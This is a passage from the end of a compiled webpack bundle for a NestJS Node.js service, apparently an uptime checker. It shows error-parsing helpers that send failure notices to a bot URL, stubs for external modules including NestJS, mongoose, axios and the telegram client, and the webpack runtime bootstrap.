                .map(([k, v]) => `${k}: ${safeStringify(v, depth + 1, maxDepth)}`);
            if (entries.length === 0)
                return '{}';
            return `{${entries.join(', ')}}`;
        }
        return String(data);
    }
    catch (error) {
        return `[Error Stringifying: ${error instanceof Error ? error.message : String(error)}]`;
    }
}
function extractMessage(data, path = '', depth = 0, maxDepth = 5) {
    try {
        if (depth > maxDepth) {
            return `${path}=[Max Depth Reached]`;
        }
        if (data === null || data === undefined) {
            return '';
        }
        if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {
            return path ? `${path}=${data}` : String(data);
        }
        if (data instanceof Error) {
            const errorInfo = [
                data.message ? `message=${data.message}` : '',
                data.name ? `name=${data.name}` : '',
                data.stack ? `stack=${data.stack.split('\n')[0]}` : ''
            ].filter(Boolean).join('\n');
            return path ? `${path}=(${errorInfo})` : errorInfo;
        }
        if (Array.isArray(data)) {
            if (data.length === 0) {
                return '';
            }
            return data
                .map((item, index) => extractMessage(item, path ? `${path}[${index}]` : `[${index}]`, depth + 1, maxDepth))
                .filter(Boolean)
                .join('\n');
        }
        if (typeof data === 'object') {
            const messages = [];
            for (const key of Object.keys(data)) {
                const value = data[key];
                const newPath = path ? `${path}.${key}` : key;
                const extracted = extractMessage(value, newPath, depth + 1, maxDepth);
                if (extracted) {
                    messages.push(extracted);
                }
            }
            return messages.join('\n');
        }
        return '';
    }
    catch (error) {
        console.error("Error in extractMessage:", error);
        return `Error extracting message: ${error instanceof Error ? error.message : String(error)}`;
    }
}
async function sendNotification(url, timeout = DEFAULT_ERROR_CONFIG.notificationTimeout) {
    try {
        if (!url || typeof url !== 'string' || !url.startsWith('http')) {
            console.error("Invalid notification URL:", url);
            return undefined;
        }
        return await axios_1.default.get(url, {
            timeout,
            validateStatus: status => status < 500
        });
    }
    catch (error) {
        console.error("Failed to send notification:", error instanceof Error ? error.message : String(error));
        return undefined;
    }
}
function shouldIgnoreError(message, status, patterns) {
    if (status === 429)
        return true;
    return patterns.some(pattern => pattern.test(message));
}
function extractStatusCode(err, defaultStatus) {
    if (!err)
        return defaultStatus;
    if (err.response) {
        const response = err.response;
        return response.data?.statusCode ||
            response.data?.status ||
            response.data?.ResponseCode ||
            response.status ||
            err.status ||
            defaultStatus;
    }
    return err.statusCode || err.status || defaultStatus;
}
function extractErrorMessage(err, defaultMessage) {
    if (!err)
        return defaultMessage;
    if (err.response?.data) {
        const responseData = err.response.data;
        return responseData.message ||
            responseData.errors ||
            responseData.ErrorMessage ||
            responseData.errorMessage ||
            responseData.UserMessage ||
            (typeof responseData === 'string' ? responseData : null) ||
            err.response.statusText ||
            err.message ||
            defaultMessage;
    }
    if (err.request) {
        return err.data?.message ||
            err.data?.errors ||
            err.data?.ErrorMessage ||
            err.data?.errorMessage ||
            err.data?.UserMessage ||
            (typeof err.data === 'string' ? err.data : null) ||
            err.message ||
            err.statusText ||
            'The request was triggered but no response was received';
    }
    return err.message || err.errorMessage || defaultMessage;
}
function extractErrorType(err, defaultError) {
    if (!err)
        return defaultError;
    if (err.response?.data?.error) {
        return err.response.data.error;
    }
    return err.error || err.name || err.code || defaultError;
}
function parseError(err, prefix, sendErr = true, config = {}) {
    const fullConfig = { ...DEFAULT_ERROR_CONFIG, ...config };
    try {
        const clientId = process.env.clientId || 'UptimeChecker2';
        const prefixStr = `${clientId}${prefix ? ` - ${prefix}` : ''}`;
        const status = extractStatusCode(err, fullConfig.defaultStatus);
        const rawMessage = extractErrorMessage(err, fullConfig.defaultMessage);
        const error = extractErrorType(err, fullConfig.defaultError);
        let extractedMessage;
        try {
            extractedMessage = typeof rawMessage === 'string' ? rawMessage : extractMessage(rawMessage);
        }
        catch (e) {
            extractedMessage = safeStringify(rawMessage) || 'Error extracting message';
        }
        const fullMessage = `${prefixStr} :: ${extractedMessage}`;
        console.log("parsedErr: ", fullMessage);
        const response = {
            status,
            message: err.errorMessage ? err.errorMessage : String(fullMessage).slice(0, fullConfig.maxMessageLength),
            error,
            raw: err
        };
        if (sendErr) {
            try {
                const ignoreError = shouldIgnoreError(fullMessage, status, fullConfig.ignorePatterns);
                if (!ignoreError) {
                    const notificationMessage = err.errorMessage ? err.errorMessage : extractedMessage;
                    const notifUrl = `${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(prefixStr)} :: ${encodeURIComponent(notificationMessage)}`;
                    sendNotification(notifUrl, fullConfig.notificationTimeout)
                        .catch(e => console.error("Failed to send error notification:", e));
                }
            }
            catch (notificationError) {
                console.error('Failed to prepare error notification:', notificationError);
            }
        }
        return response;
    }
    catch (fatalError) {
        console.error("Fatal error in parseError:", fatalError);
        return {
            status: fullConfig.defaultStatus,
            message: "Error in error handling",
            error: "FatalError",
            raw: err
        };
    }
}
function isAxiosError(error) {
    return axios_1.default.isAxiosError(error);
}
function createError(message, status = 500, errorType = 'ApplicationError') {
    return {
        status,
        message,
        error: errorType
    };
}
exports.ErrorUtils = {
    parseError,
    extractMessage,
    sendNotification,
    createError,
    isAxiosError
};


/***/ }),

/***/ "@nestjs/common":
/*!*********************************!*\
  !*** external "@nestjs/common" ***!
  \*********************************/
/***/ ((module) => {

module.exports = require("@nestjs/common");

/***/ }),

/***/ "@nestjs/config":
/*!*********************************!*\
  !*** external "@nestjs/config" ***!
  \*********************************/
/***/ ((module) => {

module.exports = require("@nestjs/config");

/***/ }),

/***/ "@nestjs/core":
/*!*******************************!*\
  !*** external "@nestjs/core" ***!
  \*******************************/
/***/ ((module) => {

module.exports = require("@nestjs/core");

/***/ }),

/***/ "@nestjs/mapped-types":
/*!***************************************!*\
  !*** external "@nestjs/mapped-types" ***!
  \***************************************/
/***/ ((module) => {

module.exports = require("@nestjs/mapped-types");

/***/ }),

/***/ "@nestjs/mongoose":
/*!***********************************!*\
  !*** external "@nestjs/mongoose" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("@nestjs/mongoose");

/***/ }),

/***/ "@nestjs/platform-express":
/*!*******************************************!*\
  !*** external "@nestjs/platform-express" ***!
  \*******************************************/
/***/ ((module) => {

module.exports = require("@nestjs/platform-express");

/***/ }),

/***/ "@nestjs/swagger":
/*!**********************************!*\
  !*** external "@nestjs/swagger" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("@nestjs/swagger");

/***/ }),

/***/ "adm-zip":
/*!**************************!*\
  !*** external "adm-zip" ***!
  \**************************/
/***/ ((module) => {

module.exports = require("adm-zip");

/***/ }),

/***/ "axios":
/*!************************!*\
  !*** external "axios" ***!
  \************************/
/***/ ((module) => {

module.exports = require("axios");

/***/ }),

/***/ "big-integer":
/*!******************************!*\
  !*** external "big-integer" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("big-integer");

/***/ }),

/***/ "class-transformer":
/*!************************************!*\
  !*** external "class-transformer" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("class-transformer");

/***/ }),

/***/ "class-validator":
/*!**********************************!*\
  !*** external "class-validator" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("class-validator");

/***/ }),

/***/ "cloudinary":
/*!*****************************!*\
  !*** external "cloudinary" ***!
  \*****************************/
/***/ ((module) => {

module.exports = require("cloudinary");

/***/ }),

/***/ "crypto":
/*!*************************!*\
  !*** external "crypto" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("crypto");

/***/ }),

/***/ "fs":
/*!*********************!*\
  !*** external "fs" ***!
  \*********************/
/***/ ((module) => {

module.exports = require("fs");

/***/ }),

/***/ "https":
/*!************************!*\
  !*** external "https" ***!
  \************************/
/***/ ((module) => {

module.exports = require("https");

/***/ }),

/***/ "imap":
/*!***********************!*\
  !*** external "imap" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("imap");

/***/ }),

/***/ "mongoose":
/*!***************************!*\
  !*** external "mongoose" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("mongoose");

/***/ }),

/***/ "multer":
/*!*************************!*\
  !*** external "multer" ***!
  \*************************/
/***/ ((module) => {

module.exports = require("multer");

/***/ }),

/***/ "path":
/*!***********************!*\
  !*** external "path" ***!
  \***********************/
/***/ ((module) => {

module.exports = require("path");

/***/ }),

/***/ "telegram":
/*!***************************!*\
  !*** external "telegram" ***!
  \***************************/
/***/ ((module) => {

module.exports = require("telegram");

/***/ }),

/***/ "telegram/Helpers":
/*!***********************************!*\
  !*** external "telegram/Helpers" ***!
  \***********************************/
/***/ ((module) => {

module.exports = require("telegram/Helpers");

/***/ }),

/***/ "telegram/Password":
/*!************************************!*\
  !*** external "telegram/Password" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("telegram/Password");

/***/ }),

/***/ "telegram/client/uploads":
/*!******************************************!*\
  !*** external "telegram/client/uploads" ***!
  \******************************************/
/***/ ((module) => {

module.exports = require("telegram/client/uploads");

/***/ }),

/***/ "telegram/events":
/*!**********************************!*\
  !*** external "telegram/events" ***!
  \**********************************/
/***/ ((module) => {

module.exports = require("telegram/events");

/***/ }),

/***/ "telegram/extensions/Logger":
/*!*********************************************!*\
  !*** external "telegram/extensions/Logger" ***!
  \*********************************************/
/***/ ((module) => {

module.exports = require("telegram/extensions/Logger");

/***/ }),

/***/ "telegram/sessions":
/*!************************************!*\
  !*** external "telegram/sessions" ***!
  \************************************/
/***/ ((module) => {

module.exports = require("telegram/sessions");

/***/ }),

/***/ "telegram/tl":
/*!******************************!*\
  !*** external "telegram/tl" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("telegram/tl");

/***/ }),

/***/ "url":
/*!**********************!*\
  !*** external "url" ***!
  \**********************/
/***/ ((module) => {

module.exports = require("url");

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	// This entry module is referenced by other modules so it can't be inlined
/******/ 	var __webpack_exports__ = __webpack_require__("./src/main.ts");
/******/ 	var __webpack_export_target__ = exports;
/******/ 	for(var __webpack_i__ in __webpack_exports__) __webpack_export_target__[__webpack_i__] = __webpack_exports__[__webpack_i__];
/******/ 	if(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, "__esModule", { value: true });
/******/ 	
/******/ })()
;
//# sourceMappingURL=index.js.map